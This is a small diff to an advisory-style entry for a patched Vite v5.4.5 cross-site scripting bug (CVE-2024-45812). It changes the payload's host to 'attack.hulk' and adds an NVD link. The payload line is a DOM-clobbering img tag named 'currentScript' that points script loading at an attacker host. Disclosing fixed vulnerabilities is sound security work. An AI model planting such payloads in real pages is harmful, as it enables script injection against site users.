@@ -5,9 +5,9 @@
 + Library: Vite
 + Version: v5.4.5
 + Stars: 67.2K
-+ Payload: ```<img src="https://xxx.xxx.xxx" name="currentScript">```
++ Payload: ```<img src="https://attack.hulk" name="currentScript">```
 + Impact: XSS
-+ CVE: CVE-2024-45812
++ CVE: [CVE-2024-45812](https://nvd.nist.gov/vuln/detail/CVE-2024-45812)
 + Status: Patched
 + Foundby: TheHulk
 
